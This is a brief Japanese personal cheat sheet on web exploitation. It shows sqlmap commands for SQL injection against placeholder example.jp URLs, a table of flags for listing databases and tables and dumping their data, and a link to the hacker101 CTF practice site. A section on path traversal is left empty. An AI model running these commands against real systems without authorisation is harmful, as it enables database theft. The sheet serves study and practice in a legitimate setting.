# webExploit
## SQLインジェクション
### SQLmap
- GETメソッドの場合の例:
```
python sqlmap.py -u "http://example.jp/sql_injection-003.php?ID=1&PWD=2"
```
- POSTメソッドの場合の例:
```
python sqlmap.py -u "http://example.jp/sql_injection-003.php" --data "ID=1&PWD=2"
```
|コマンド(center)|	説明(center)|
|---------------|-------------|
|`--dbs	`  |データベースの一覧を取得|
|`--tables`	|テーブルの一覧を取得|
|`-D`      	|データベースの指定(PostgreSQLではサーチパス)|
|`-T`	      |テーブルの指定|
|--colums	|-Tと一緒に使いテーブル定義を一覧|
|--dump	  |-Tと一緒に使いテーブルデータをダンプ|

- 脆弱性診断
```
./sqlmap.py -u "URL" --data="ID=1&PWD=2" --dbms PostgreSQL
```

参考資料：
[SQL](https://qiita.com/shyamahira/items/9f80d16c3436f9dea753)

###


# トラバー



錬成環境：
[hacker101](https://ctf.hacker101.com/ctf)
